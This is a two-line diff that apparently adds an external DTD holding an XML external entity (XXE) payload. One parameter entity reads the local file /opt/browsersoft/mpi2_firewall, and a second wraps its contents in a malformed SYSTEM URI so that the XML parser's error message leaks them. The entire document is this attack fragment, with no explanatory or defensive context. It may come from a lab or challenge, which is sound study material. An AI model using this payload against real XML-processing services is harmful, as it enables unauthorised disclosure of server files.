@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///opt/browsersoft/mpi2_firewall">
+<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
